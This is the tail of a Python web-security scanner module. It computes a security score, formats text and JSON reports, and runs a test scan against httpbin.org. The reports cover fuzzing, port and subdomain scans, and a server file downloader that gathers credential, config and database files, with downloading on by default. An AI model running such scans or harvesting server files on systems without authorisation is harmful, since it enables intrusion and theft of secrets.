                'error': error_msg,
                'total_time': time.time() - scan_start
            }
        finally:
            # Cleanup
            if self.session:
                await self.session.close()
    
    def calculate_security_score(self, results):
        """Calculate overall security score (0-100)"""
        score = 100
        
        # Deduct for vulnerabilities
        vuln_count = results.get('vulnerabilities', {}).get('count', 0)
        score -= vuln_count * 5
        
        # Deduct for missing security headers
        security_headers = results.get('initial_analysis', {}).get('security_headers', {})
        missing_count = security_headers.get('missing_count', 0)
        score -= missing_count * 3
        
        # Deduct for SSL issues
        ssl_info = results.get('initial_analysis', {}).get('ssl_info', {})
        if not ssl_info.get('valid', True):
            score -= 10
        if ssl_info.get('weak_cipher', False):
            score -= 5
        
        # Deduct for sensitive files found
        file_download = results.get('file_download', {})
        if isinstance(file_download, dict):
            sensitive_files = file_download.get('sensitive_files', [])
        else:
            sensitive_files = []
        
        score -= len(sensitive_files) * 2
        
        # Deduct for server files found
        server_download = results.get('server_file_download', {})
        if isinstance(server_download, dict) and server_download.get('success'):
            server_files = server_download.get('analysis', {}).get('config_files', [])
            score -= len(server_files) * 1
        
        # Ensure score is within bounds
        return max(0, min(100, score))
    
    def format_results(self, results):
        """Format results for display"""
        if not results.get('scan_complete', False):
            return f"Scan failed: {results.get('error', 'Unknown error')}"
        
        formatted = []
        formatted.append("=" * 70)
        formatted.append(f"{C.BOLD}🚀 WEB SECURITY SCAN REPORT - PRODUCTION EDITION{C.RESET}")
        formatted.append(f"{C.BOLD}🖥️ WITH SERVER FILE DOWNLOADER{C.RESET}")
        formatted.append("=" * 70)
        
        # Basic Info
        formatted.append(f"\n{C.BOLD}📋 TARGET INFORMATION{C.RESET}")
        formatted.append(f"  🔗 URL: {results.get('target', 'N/A')}")
        formatted.append(f"  🌐 Domain: {results.get('domain', 'N/A')}")
        formatted.append(f"  ⚡ Scan Mode: {results.get('scan_mode', 'N/A')}")
        formatted.append(f"  📥 File Download: {'Enabled' if results.get('download_files') else 'Disabled'}")
        formatted.append(f"  🖥️ Server File Download: {'Enabled' if results.get('download_server_files') else 'Disabled'}")
        formatted.append(f"  ⏱️  Scan Time: {results.get('total_time', 0):.1f} seconds")
        formatted.append(f"  🛡️  Security Score: {results.get('security_score', 0)}/100")
        
        # File Download Summary
        file_download = results.get('file_download', {})
        if file_download and isinstance(file_download, dict):
            formatted.append(f"\n{C.BOLD}📁 WEB FILE DOWNLOAD SUMMARY{C.RESET}")
            formatted.append(f"  📊 Total Downloaded: {file_download.get('total_downloaded', 0)} files")
            formatted.append(f"  📦 Total Size: {file_download.get('total_size', 0)/1024:.2f} KB")
            formatted.append(f"  🔐 Sensitive Files: {len(file_download.get('sensitive_files', []))}")
            formatted.append(f"  📜 JS Files: {len(file_download.get('js_files', []))}")
            
            if file_download.get('archive_path'):
                formatted.append(f"  🗜️  Archive: {file_download.get('archive_path')}")
        
        # Server File Download Summary
        server_download = results.get('server_file_download', {})
        if server_download and isinstance(server_download, dict) and server_download.get('success'):
            formatted.append(f"\n{C.BOLD}🖥️ SERVER FILE DOWNLOAD SUMMARY{C.RESET}")
            formatted.append(f"  📊 Total Downloaded: {server_download.get('total_downloaded', 0)} files")
            formatted.append(f"  🏗️  Server Type: {server_download.get('server_type', 'unknown')}")
            
            analysis = server_download.get('analysis', {})
            if analysis:
                formatted.append(f"  ⚙️  Config Files: {analysis.get('config_files_count', 0)}")
                formatted.append(f"  🔐 Credential Files: {analysis.get('credential_files_count', 0)}")
                formatted.append(f"  📋 Log Files: {analysis.get('log_files_count', 0)}")
                formatted.append(f"  💾 Database Files: {analysis.get('database_files_count', 0)}")
                formatted.append(f"  💻 Source Code: {analysis.get('source_code_count', 0)}")
                formatted.append(f"  🔍 Interesting Findings: {analysis.get('interesting_findings_count', 0)}")
            
            if server_download.get('report_path'):
                formatted.append(f"  📄 Report: {server_download.get('report_path')}")
        
        # Initial Analysis
        initial = results.get('initial_analysis', {})
        if initial:
            formatted.append(f"\n{C.BOLD}🔍 INITIAL ANALYSIS{C.RESET}")
            formatted.append(f"  ✅ Status Code: {initial.get('status_code', 'N/A')}")
            formatted.append(f"  🐇 Response Time: {initial.get('response_time', 0):.2f}s")
            formatted.append(f"  📦 Content Size: {initial.get('content_size', 0):,} bytes")
            formatted.append(f"  🖥️  Server: {initial.get('server_info', 'Unknown')}")
            
            # Technologies
            tech = initial.get('technologies', {})
            if tech.get('technologies'):
                formatted.append(f"\n{C.BOLD}🛠️ DETECTED TECHNOLOGIES{C.RESET}")
                total = tech.get('total_technologies', 0)
                formatted.append(f"  📊 Total: {total} technologies found")
                
                for category, techs in tech['technologies'].items():
                    if techs:
                        formatted.append(f"  {category}: {', '.join(techs[:5])}")
                        if len(techs) > 5:
                            formatted.append(f"    ... and {len(techs) - 5} more")
            
            # Security Headers
            security = initial.get('security_headers', {})
            formatted.append(f"\n{C.BOLD}🛡️ SECURITY HEADERS{C.RESET}")
            formatted.append(f"  ✅ Present: {security.get('present_count', 0)}/{security.get('total_checked', 6)}")
            formatted.append(f"  📊 Score: {security.get('security_score', 0)}/100")
            
            missing = security.get('missing_headers', [])
            if missing:
                formatted.append(f"  ❌ Missing: {', '.join(missing)}")
        
        # Crawling Results
        crawling = results.get('crawling', {})
        if crawling.get('crawled', 0) > 0:
            formatted.append(f"\n{C.BOLD}🕷️ SITE CRAWLING{C.RESET}")
            formatted.append(f"  📄 Pages Crawled: {crawling.get('crawled', 0)}")
            formatted.append(f"  🔗 Total Links Found: {crawling.get('total_visited', 0)}")
        
        # Fuzzing Results
        fuzzing = results.get('fuzzing', {})
        formatted.append(f"\n{C.BOLD}🔎 DIRECTORY FUZZING{C.RESET}")
        formatted.append(f"  📁 Paths Tested: {fuzzing.get('tested', 0)}")
        formatted.append(f"  ✅ Accessible Paths Found: {fuzzing.get('found', 0)}")
        
        # Show top found paths
        paths = fuzzing.get('paths', [])[:5]
        if paths:
            formatted.append(f"  🏆 Top Paths Found:")
            for path in paths:
                status = path.get('status', 0)
                title = path.get('title', '')
                line = f"    - {path.get('path', '')} ({status})"
                if title and title != 'No Title Found':
                    line += f" - {title}"
                formatted.append(line)
        
        # Vulnerabilities
        vulns = results.get('vulnerabilities', {})
        formatted.append(f"\n{C.BOLD}⚠️ VULNERABILITY ASSESSMENT{C.RESET}")
        formatted.append(f"  🔴 Critical: {sum(1 for v in vulns.get('vulnerabilities', []) if v.get('severity') == 'Critical')}")
        formatted.append(f"  🟠 High: {sum(1 for v in vulns.get('vulnerabilities', []) if v.get('severity') == 'High')}")
        formatted.append(f"  🟡 Medium: {sum(1 for v in vulns.get('vulnerabilities', []) if v.get('severity') == 'Medium')}")
        formatted.append(f"  🟢 Low: {sum(1 for v in vulns.get('vulnerabilities', []) if v.get('severity') == 'Low')}")
        
        vulnerabilities = vulns.get('vulnerabilities', [])
        if vulnerabilities:
            formatted.append(f"\n  📋 Details:")
            for i, vuln in enumerate(vulnerabilities[:5], 1):
                vuln_type = vuln.get('type', 'Unknown')
                severity = vuln.get('severity', 'Medium')
                severity_color = {
                    'Critical': C.RED,
                    'High': C.ORANGE,
                    'Medium': C.YELLOW,
                    'Low': C.GREEN
                }.get(severity, C.WHITE)
                
                formatted.append(f"    {i}. {severity_color}{severity}{C.RESET}: {vuln_type}")
                if 'parameter' in vuln:
                    formatted.append(f"       Parameter: {vuln.get('parameter')}")
                if 'url' in vuln:
                    formatted.append(f"       URL: {vuln.get('url')[:50]}...")
        
        # Network Scan
        network = results.get('network', {})
        if network.get('performed', False):
            formatted.append(f"\n{C.BOLD}🌐 NETWORK ANALYSIS{C.RESET}")
            formatted.append(f"  📍 IP Address: {network.get('ip', 'N/A')}")
            formatted.append(f"  🔌 Ports Checked: {network.get('total_checked', 0)}")
            
            open_ports = network.get('open_ports', [])
            if open_ports:
                formatted.append(f"  ✅ Open Ports: {', '.join(map(str, open_ports))}")
                # Show services
                services = network.get('services', {})
                if services:
                    formatted.append(f"  🛠️  Detected Services:")
                    for port, info in services.items():
                        service = info.get('service', 'Unknown')
                        formatted.append(f"    - Port {port}: {service}")
            else:
                formatted.append(f"  ✅ Open Ports: None found")
        
        # Subdomains
        subdomains = results.get('subdomains', {})
        if subdomains.get('performed', False):
            formatted.append(f"\n{C.BOLD}🌍 SUBDOMAIN DISCOVERY{C.RESET}")
            formatted.append(f"  🔍 Subdomains Found: {subdomains.get('found', 0)}")
            
            subs = subdomains.get('subdomains', [])[:5]
            if subs:
                formatted.append(f"  📋 Found Subdomains:")
                for sub in subs:
                    formatted.append(f"    - {sub.get('subdomain')}.{results.get('domain')} ({sub.get('status')})")
        
        # HTML Analysis
        html_analysis = initial.get('html_analysis', {})
        if html_analysis:
            formatted.append(f"\n{C.BOLD}📄 HTML ANALYSIS{C.RESET}")
            formatted.append(f"  🔗 Links Found: {html_analysis.get('links_found', 0)}")
            formatted.append(f"  📜 Scripts Found: {html_analysis.get('scripts_found', 0)}")
            formatted.append(f"  📋 Forms Found: {html_analysis.get('forms_found', 0)}")
            formatted.append(f"  🔑 Parameters Found: {html_analysis.get('parameters_found', 0)}")
            
            api_endpoints = html_analysis.get('api_endpoints', [])
            if api_endpoints:
                formatted.append(f"  🔌 API Endpoints: {len(api_endpoints)} found")
        
        # Statistics
        stats = results.get('stats', {})
        formatted.append(f"\n{C.BOLD}📊 SCAN STATISTICS{C.RESET}")
        formatted.append(f"  📨 Requests Made: {stats.get('requests_made', 0)}")
        formatted.append(f"  ❌ Errors: {stats.get('errors', 0)}")
        formatted.append(f"  ⚡ Vulnerabilities Found: {stats.get('vulnerabilities_found', 0)}")
        formatted.append(f"  📥 Web Files Downloaded: {stats.get('files_downloaded', 0)}")
        formatted.append(f"  🖥️ Server Files Downloaded: {stats.get('server_files_downloaded', 0)}")
        formatted.append(f"  🔐 Sensitive Files: {stats.get('sensitive_files_found', 0)}")
        formatted.append(f"  📜 JS Files: {stats.get('js_files_downloaded', 0)}")
        
        # Server Analysis Findings
        if server_download and isinstance(server_download, dict) and server_download.get('success'):
            analysis = server_download.get('analysis', {})
            interesting = analysis.get('interesting_findings', [])
            
            if interesting:
                formatted.append(f"\n{C.BOLD}🔍 SERVER ANALYSIS FINDINGS{C.RESET}")
                for i, finding in enumerate(interesting[:10], 1):
                    finding_type = finding.get('type', 'Unknown')
                    finding_file = finding.get('file', 'Unknown')
                    finding_value = finding.get('value', '')
                    
                    formatted.append(f"  {i}. {finding_type} in {finding_file}")
                    if finding_value:
                        formatted.append(f"     Value: {finding_value}")
        
        # Recommendations
        formatted.append(f"\n{C.BOLD}💡 RECOMMENDATIONS{C.RESET}")
        
        recommendations = []
        security_score = results.get('security_score', 0)
        
        if security_score < 50:
            recommendations.append("🚨 Immediate action required! Critical vulnerabilities found.")
        elif security_score < 70:
            recommendations.append("⚠️  Security improvements needed. Address high-priority issues.")
        elif security_score < 85:
            recommendations.append("✅ Good baseline security. Consider addressing medium issues.")
        else:
            recommendations.append("🎉 Excellent security posture! Maintain current practices.")
        
        # Specific recommendations based on findings
        if vulns.get('count', 0) > 0:
            recommendations.append("🔧 Fix identified vulnerabilities as soon as possible.")
        
        missing_headers = initial.get('security_headers', {}).get('missing_headers', [])
        if missing_headers:
            recommendations.append(f"🛡️  Implement missing security headers: {', '.join(missing_headers[:3])}")
        
        if network.get('open_ports', []):
            recommendations.append("🔒 Close unnecessary open ports to reduce attack surface.")
        
        if stats.get('sensitive_files_found', 0) > 0:
            recommendations.append("🔐 Remove or protect sensitive files from public access.")
        
        if server_download and isinstance(server_download, dict) and server_download.get('success'):
            recommendations.append("🖥️ Review server configuration files for exposed credentials.")
        
        for rec in recommendations[:5]:
            formatted.append(f"  • {rec}")
        
        formatted.append(f"\n{C.BOLD}📅 Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}")
        formatted.append("=" * 70)
        
        return "\n".join(formatted)
    
    def generate_json_report(self, results):
        """Generate JSON report"""
        if not results.get('scan_complete', False):
            return json.dumps({'error': results.get('error', 'Scan failed')}, indent=2)
        
        # Clean up for JSON serialization
        report = {
            'scan_info': {
                'target': results.get('target'),
                'domain': results.get('domain'),
                'scan_mode': results.get('scan_mode'),
                'download_enabled': results.get('download_files'),
                'server_download_enabled': results.get('download_server_files'),
                'start_time': results.get('start_time'),
                'total_time': results.get('total_time'),
                'security_score': results.get('security_score', 0)
            },
            'technologies': results.get('initial_analysis', {}).get('technologies', {}),
            'security_headers': results.get('initial_analysis', {}).get('security_headers', {}),
            'vulnerabilities': results.get('vulnerabilities', {}),
            'fuzzing_results': results.get('fuzzing', {}),
            'file_download': results.get('file_download', {}),
            'server_file_download': results.get('server_file_download', {}),
            'network_scan': results.get('network', {}),
            'subdomains': results.get('subdomains', {}),
            'crawling_results': results.get('crawling', {}),
            'statistics': results.get('stats', {})
        }
        
        return json.dumps(report, indent=2, default=str)

# ==================== MAIN FUNCTION ====================

def run(inputs: Dict, options: Dict = None) -> Dict:
    """
    Main entry point for Sirra Framework
    Returns comprehensive results
    """
    start_time = time.time()
    
    try:
        # Extract inputs with defaults
        target_url = inputs.get('target_url', '').strip()
        scan_mode = inputs.get('scan_mode', 'Standard')
        auto_mode = inputs.get('auto_advanced', True)
        output_format = inputs.get('output_format', 'Text')
        download_files = inputs.get('download_files', True)
        download_server_files = inputs.get('download_server_files', True)
        max_file_size = inputs.get('max_file_size', 10)
        save_directory = inputs.get('save_directory', '').strip()
        
        # Auto-fill if empty
        if not target_url:
            target_url = 'https://httpbin.org'
        
        print(C.highlight(f"\n{'='*60}"))
        print(C.highlight(f"🚀 ADVANCED WEB SCANNER v{version} - PRODUCTION"))
        print(C.highlight(f"🖥️ WITH SERVER FILE DOWNLOADER"))
        print(C.highlight(f"{'='*60}"))
        print(C.info(f"🎯 Target: {target_url}"))
        print(C.info(f"⚡ Scan Mode: {scan_mode}"))
        print(C.info(f"🤖 Auto Mode: {'Enabled' if auto_mode else 'Disabled'}"))
        print(C.info(f"📥 File Download: {'Enabled' if download_files else 'Disabled'}"))
        print(C.info(f"🖥️ Server File Download: {'Enabled' if download_server_files else 'Disabled'}"))
        print(C.info(f"📏 Max File Size: {max_file_size}MB"))
        print(C.info(f"📄 Output: {output_format}"))
        print(C.highlight(f"{'='*60}"))
        
        # Create scanner
        scanner = AIScanner(
            scan_mode=scan_mode,
            auto_mode=auto_mode,
            download_files=download_files,
            download_server_files=download_server_files,
            max_file_size=max_file_size,
            save_dir=save_directory
        )
        
        # Handle asyncio
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        # Run scan
        results = loop.run_until_complete(scanner.comprehensive_scan(target_url))
        
        execution_time = time.time() - start_time
        
        if results.get('scan_complete', False):
            # Format results based on output format
            if output_format.lower() == 'json':
                formatted_results = scanner.generate_json_report(results)
            else:
                formatted_results = scanner.format_results(results)
            
            print(f"\n{formatted_results}")
            
            # Return structured results
            return {
                'success': True,
                'execution_time': execution_time,
                'target': results['target'],
                'domain': results['domain'],
                'scan_mode': results['scan_mode'],
                'download_enabled': results.get('download_files', False),
                'server_download_enabled': results.get('download_server_files', False),
                'total_time': results['total_time'],
                'security_score': results.get('security_score', 0),
                
                # Key metrics
                'technologies_found': results.get('initial_analysis', {}).get('technologies', {}).get('total_technologies', 0),
                'security_headers_score': results.get('initial_analysis', {}).get('security_headers', {}).get('security_score', 0),
                'pages_crawled': results.get('crawling', {}).get('crawled', 0),
                'paths_tested': results.get('fuzzing', {}).get('tested', 0),
                'paths_found': results.get('fuzzing', {}).get('found', 0),
                'vulnerabilities_found': results.get('vulnerabilities', {}).get('count', 0),
                'open_ports': len(results.get('network', {}).get('open_ports', [])),
                'subdomains_found': results.get('subdomains', {}).get('found', 0),
                'files_downloaded': results.get('stats', {}).get('files_downloaded', 0),
                'server_files_downloaded': results.get('stats', {}).get('server_files_downloaded', 0),
                'sensitive_files_found': results.get('stats', {}).get('sensitive_files_found', 0),
                'js_files_downloaded': results.get('stats', {}).get('js_files_downloaded', 0),
                'requests_made': results.get('stats', {}).get('requests_made', 0),
                
                # Detailed results
                'detailed_results': {
                    'technologies': results.get('initial_analysis', {}).get('technologies', {}),
                    'security_headers': results.get('initial_analysis', {}).get('security_headers', {}),
                    'fuzzing_results': results.get('fuzzing', {}),
                    'vulnerabilities': results.get('vulnerabilities', {}),
                    'file_download': results.get('file_download', {}),
                    'server_file_download': results.get('server_file_download', {}),
                    'network_scan': results.get('network', {}),
                    'subdomains': results.get('subdomains', {}),
                    'crawling_results': results.get('crawling', {}),
                    'html_analysis': results.get('initial_analysis', {}).get('html_analysis', {}),
                    'ssl_info': results.get('initial_analysis', {}).get('ssl_info', {})
                },
                
                'formatted_report': formatted_results if output_format.lower() != 'json' else None,
                'json_report': scanner.generate_json_report(results) if output_format.lower() == 'json' else None
            }
        else:
            return {
                'success': False,
                'error': results.get('error', 'Scan failed'),
                'execution_time': execution_time
            }
        
    except Exception as e:
        error_msg = str(e)
        print(C.error(f"\nError: {error_msg}"))
        logger.error(f"Run function error: {error_msg}", exc_info=True)
        
        return {
            'success': False,
            'error': error_msg,
            'execution_time': time.time() - start_time
        }

# ==================== TEST FUNCTION ====================

def test():
    """Test the scanner"""
    test_inputs = {
        'target_url': 'https://httpbin.org',
        'scan_mode': 'Standard',
        'auto_advanced': True,
        'output_format': 'Text',
        'download_files': True,
        'download_server_files': True,
        'max_file_size': 10,
        'save_directory': ''
    }
    
    print("\n" + "="*60)
    print("Testing Advanced Scanner v9.0 - Production")
    print("With Server File Downloader")
    print("="*60)
    
    result = run(test_inputs)
    
    print(f"\nTest Complete!")
    print(f"✅ Success: {result.get('success', False)}")
    if result.get('success'):
        print(f"⏱️  Execution Time: {result.get('execution_time', 0):.2f}s")
        print(f"🛠️  Technologies Found: {result.get('technologies_found', 0)}")
        print(f"⚠️  Vulnerabilities Found: {result.get('vulnerabilities_found', 0)}")
        print(f"📥 Web Files Downloaded: {result.get('files_downloaded', 0)}")
        print(f"🖥️ Server Files Downloaded: {result.get('server_files_downloaded', 0)}")
        print(f"🛡️  Security Score: {result.get('security_score', 0)}/100")
    else:
        print(f"❌ Error: {result.get('error', 'Unknown')}")

if __name__ == "__main__":
    test()